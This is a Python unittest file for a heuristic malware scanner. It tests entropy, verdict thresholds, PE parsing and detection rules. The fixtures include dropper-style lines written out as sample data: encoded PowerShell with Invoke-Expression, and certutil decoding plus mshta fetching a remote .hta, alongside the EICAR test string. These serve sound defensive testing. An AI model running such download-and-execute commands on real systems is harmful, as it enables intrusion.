"""Offline tests for the heuristic static-analysis engine."""

import sys
import tempfile
import unittest
from pathlib import Path

from malko import heuristics

EICAR = (
    b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
)


class HeuristicsTestCase(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmpdir.cleanup)
        self.root = Path(self.tmpdir.name)

    def _write(self, name, content):
        path = self.root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content, encoding="utf-8")
        return path

    def rule_ids(self, result):
        return {hit["id"] for hit in result["rules"]}


class TestEntropy(unittest.TestCase):
    def test_zero_entropy_for_constant_bytes(self):
        self.assertEqual(heuristics.shannon_entropy(b"\x00" * 1000), 0.0)

    def test_max_entropy_for_uniform_bytes(self):
        data = bytes(range(256)) * 4
        self.assertAlmostEqual(heuristics.shannon_entropy(data), 8.0)

    def test_empty_input(self):
        self.assertEqual(heuristics.shannon_entropy(b""), 0.0)


class TestVerdictThresholds(unittest.TestCase):
    def test_thresholds(self):
        v = heuristics.verdict_for_score
        self.assertEqual(v(0), "CLEAN")
        self.assertEqual(v(49), "CLEAN")
        self.assertEqual(v(50), "SUSPICIOUS")
        self.assertEqual(v(89), "SUSPICIOUS")
        self.assertEqual(v(90), "SUSPICIOUS+")
        self.assertEqual(v(500), "SUSPICIOUS+")


class TestSimpleRules(HeuristicsTestCase):
    def test_double_extension(self):
        path = self._write("invoice.pdf.exe", b"MZ not really")
        result = heuristics.analyze(path)
        self.assertIn("double-extension", self.rule_ids(result))
        self.assertIn(result["verdict"], ("SUSPICIOUS", "SUSPICIOUS+"))

    def test_normal_extension_no_double_hit(self):
        path = self._write("tool.exe", b"MZ not really")
        result = heuristics.analyze(path)
        self.assertNotIn("double-extension", self.rule_ids(result))

    def test_eicar_detection(self):
        path = self._write("eicar.com", EICAR)
        try:
            readback = path.read_bytes()
        except OSError:
            readback = b""
        if readback != EICAR:
            self.skipTest("host antivirus blocks EICAR content on this machine")
        result = heuristics.analyze(path)
        self.assertEqual(result["verdict"], "EICAR-TEST")
        self.assertIn("eicar-test-file", self.rule_ids(result))

    def test_risky_location(self):
        path = self._write("Temp/runme.ps1", "Write-Host hi")
        result = heuristics.analyze(path)
        self.assertIn("risky-location", self.rule_ids(result))

    def test_risky_location_markers(self):
        self.assertTrue(heuristics.is_risky_location(r"C:\Users\x\Downloads\a.exe"))
        self.assertTrue(heuristics.is_risky_location(r"C:\Users\x\AppData\Local\Temp\a.exe"))
        self.assertFalse(heuristics.is_risky_location(r"C:\Program Files\app\a.exe"))

    def test_script_patterns(self):
        path = self._write(
            "evil.ps1",
            "powershell -enc SQBFAFgA; Invoke-Expression $x; "
            "[Convert]::FromBase64String($y)",
        )
        result = heuristics.analyze(path)
        ids = self.rule_ids(result)
        self.assertIn("script-powershell-enc", ids)
        self.assertIn("script-invoke-expression", ids)
        self.assertIn("script-frombase64string", ids)
        self.assertIn(result["verdict"], ("SUSPICIOUS", "SUSPICIOUS+"))

    def test_certutil_and_mshta(self):
        path = self._write("drop.bat", "certutil -decode in.b64 out.exe\nmshta http://x/y.hta")
        ids = self.rule_ids(heuristics.analyze(path))
        self.assertIn("script-certutil-decode", ids)
        self.assertIn("script-mshta-http", ids)

    def test_benign_script_clean(self):
        # Note: the OS temp dir itself is a "risky location", so that rule
        # may legitimately fire here; no *content* rule must fire.
        path = self._write("hello.ps1", "Write-Host 'hello world'")
        result = heuristics.analyze(path)
        self.assertLessEqual(self.rule_ids(result), {"risky-location"})
        self.assertEqual(result["verdict"], "CLEAN")

    def test_office_autoopen(self):
        path = self._write("doc.doc", b"\xd0\xcf\x11\xe0 garbage AutoOpen more")
        self.assertIn("office-autoopen", self.rule_ids(heuristics.analyze(path)))

    def test_office_vba_project(self):
        path = self._write("book.xlsm", b"PK\x03\x04 word/vbaProject.bin stuff")
        self.assertIn("office-vba-project", self.rule_ids(heuristics.analyze(path)))

    def test_should_analyze(self):
        self.assertTrue(heuristics.should_analyze("a.exe"))
        self.assertTrue(heuristics.should_analyze("a.ps1"))
        self.assertFalse(heuristics.should_analyze("a.txt"))
        self.assertFalse(heuristics.should_analyze("noext"))
        self.assertTrue(heuristics.should_analyze(r"C:\Temp\noext"))


class TestPeParsing(HeuristicsTestCase):
    def test_malformed_pe_returns_none(self):
        path = self._write("fake.exe", b"MZ" + b"\x00" * 100)
        self.assertIsNone(heuristics.parse_pe(path))

    def test_non_pe_returns_none(self):
        path = self._write("plain.exe", b"just text, no headers")
        self.assertIsNone(heuristics.parse_pe(path))

    def test_parse_real_interpreter(self):
        pe = heuristics.parse_pe(sys.executable)
        if pe is None:
            self.skipTest("current interpreter exe is not parseable here")
        self.assertTrue(pe["is_exe"])
        self.assertTrue(pe["sections"])
        self.assertTrue(pe["imports"])
        self.assertIsNotNone(pe["entry_section"])
        for section in pe["sections"]:
            self.assertGreaterEqual(section["entropy"], 0.0)
            self.assertLessEqual(section["entropy"], 8.0)

    def test_analyze_real_interpreter_does_not_crash(self):
        result = heuristics.analyze(sys.executable)
        self.assertIn(result["verdict"], ("CLEAN", "SUSPICIOUS", "SUSPICIOUS+"))
        self.assertIsInstance(result["score"], int)


if __name__ == "__main__":
    unittest.main()
